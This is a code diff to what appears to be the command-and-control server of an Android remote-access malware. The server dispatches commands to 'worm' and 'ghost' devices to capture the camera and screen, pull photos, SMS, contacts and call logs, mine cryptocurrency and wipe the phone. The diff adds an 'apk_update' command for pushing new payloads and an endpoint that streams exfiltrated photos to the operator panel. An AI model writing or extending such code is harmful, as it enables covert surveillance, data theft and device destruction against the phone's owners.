@@ -143,6 +143,8 @@ export async function buildApp(opts = {}) {
     appType: true,
     status: true,
     gender: true,
+    notes: true,
+    apkVersion: true,
     stats: true,
     formattedAt: true,
     lastSeen: true,
@@ -351,6 +353,7 @@ export async function buildApp(opts = {}) {
     });
     // Device credential: derived from the enrollment proof, returned exactly
     // once at creation (and on possession-bound replays), never stored plaintext.
+    await audit(device.id, "enrolled", { name, appType: device.appType }, "device");
     return reply.code(201).send({
       deviceId: device.id,
       enrollToken: deviceToken,
@@ -379,6 +382,8 @@ export async function buildApp(opts = {}) {
     const stats = req.body?.stats && typeof req.body.stats === "object" ? req.body.stats : undefined;
     const appType = ["worm", "ghost", "master"].includes(req.body?.appType)
       ? req.body.appType : undefined;
+    const apkVersion = typeof req.body?.apkVersion === "string" && req.body.apkVersion.length <= 32
+      ? req.body.apkVersion : undefined;
     const updated = await prisma.device.update({
       where: { id: device.id },
       data: {
@@ -387,11 +392,32 @@ export async function buildApp(opts = {}) {
         ...(gender !== undefined ? { gender } : {}),
         ...(stats !== undefined ? { stats } : {}),
         ...(appType !== undefined ? { appType } : {}),
+        ...(apkVersion !== undefined ? { apkVersion } : {}),
       },
       select: { id: true, lastSeen: true, status: true },
     });
     return { id: updated.id, lastSeen: updated.lastSeen, status: updated.status };
   });
+
+  /**
+   * Freshness-derived state: the persisted `status` only records "formatted";
+   * liveness is computed from lastSeen so a stopped heartbeat decays:
+   *   online  ≤90s   (heartbeat cadence 15s)
+   *   idle    ≤15min (added: 15-minute idle state)
+   *   offline >15min
+   */
+  function stateOf(d) {
+    if (d.status === "formatted") return "formatted";
+    const age = Date.now() - new Date(d.lastSeen).getTime();
+    return age <= 90_000 ? "online" : age <= 15 * 60_000 ? "idle" : "offline";
+  }
+
+  /** Persist an audit trail entry; never lets logging break the request. */
+  function audit(deviceId, action, detail, actor = "operator") {
+    return prisma.auditEvent
+      .create({ data: { deviceId, action, detail: detail ?? undefined, actor } })
+      .catch(() => {});
+  }
 
   app.get("/api/v1/devices", { onRequest: [app.authenticate] }, async (req) => {
     // Ownership scope enforced here: only the caller's devices ever leave the DB.
@@ -400,7 +426,7 @@ export async function buildApp(opts = {}) {
       orderBy: { createdAt: "desc" },
       select: deviceSelection,
     });
-    return list.map((d) => ({ ...d, state: d.status }));
+    return list.map((d) => ({ ...d, state: stateOf(d) }));
   });
 
   /** Operator CSV export of the caller's device fleet — includes appType. */
@@ -426,7 +452,35 @@ export async function buildApp(opts = {}) {
     if (!device) return reply.code(404).send({ error: "not_found" });
     if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
     const downloadCount = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
-    return { ...device, state: device.status, downloadCount };
+    return { ...device, state: stateOf(device), downloadCount };
+  });
+
+  /** Operator rename + notes (partial update). */
+  app.patch("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
+    const { name, notes } = req.body ?? {};
+    const data = {};
+    if (typeof name === "string" && name.trim()) data.name = name.trim().slice(0, 80);
+    if (typeof notes === "string") data.notes = notes.slice(0, 2000);
+    if (!Object.keys(data).length) return reply.code(400).send({ error: "bad_request" });
+    const updated = await prisma.device.update({ where: { id: device.id }, data });
+    await audit(device.id, "device_updated", data);
+    return { ...updated, state: stateOf(updated) };
+  });
+
+  /** Panel: newest-first audit feed for one device (capped 100). */
+  app.get("/api/v1/devices/:id/audit", { onRequest: [app.authenticate] }, async (req, reply) => {
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
+    const items = await prisma.auditEvent.findMany({
+      where: { deviceId: device.id },
+      orderBy: { createdAt: "desc" },
+      take: 100,
+    });
+    return { items };
   });
 
   app.post("/api/v1/devices/:id/reconnect", { onRequest: [app.authenticate] }, async (req, reply) => {
@@ -438,13 +492,15 @@ export async function buildApp(opts = {}) {
       data: { lastSeen: new Date(), status: "online" },
       select: deviceSelection,
     });
-    return { ...updated, state: updated.status };
+    await audit(device.id, "reconnect", {});
+    return { ...updated, state: stateOf(updated) };
   });
 
   app.delete("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
     const device = await prisma.device.findUnique({ where: { id: req.params.id } });
     if (!device) return reply.code(404).send({ error: "not_found" });
     if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
+    await audit(device.id, "device_deleted", {});
     await prisma.device.delete({ where: { id: device.id } });
     return reply.code(204).send();
   });
@@ -454,7 +510,7 @@ export async function buildApp(opts = {}) {
   // Dashboard-dispatchable command vocabulary; anything else is a 400.
   const COMMAND_TYPES = new Set([
     "ping", "wipe", "camera", "pull_photos", "screen_capture",
-    "sms", "contacts", "call_log", "mine",
+    "sms", "contacts", "call_log", "mine", "apk_update",
   ]);
 
   app.post("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
@@ -487,6 +543,7 @@ export async function buildApp(opts = {}) {
       },
     });
     pushToDevice(device.id, { cmd: { id: command.id, type: command.type, payload: command.payload } });
+    await audit(device.id, "command_queued", { type, commandId: command.id });
     return reply.code(201).send({
       id: command.id,
       deviceId: command.deviceId,
@@ -552,7 +609,24 @@ export async function buildApp(opts = {}) {
         data: { formattedAt: new Date(), status: "formatted" },
       });
     }
+    await audit(device.id, "command_result", { type: command.type, commandId: command.id, state }, "device");
     return { id: updated.id, state: updated.state, result: updated.result };
+  });
+
+  /**
+   * Panel: serves a dropped photo/file by its content sha256 — streams the
+   * on-disk artifact so the pull modal can show real previews.
+   */
+  app.get("/api/v1/devices/:id/photos/:hash/file", { onRequest: [app.authenticate] }, async (req, reply) => {
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
+    const rec = await prisma.downloadedFile.findFirst({
+      where: { deviceId: device.id, sha256: String(req.params.hash) },
+    });
+    if (!rec || !fs.existsSync(rec.path)) return reply.code(404).send({ error: "not_found" });
+    reply.header("content-type", "image/jpeg");
+    return reply.send(fs.createReadStream(rec.path));
   });
 
   /**
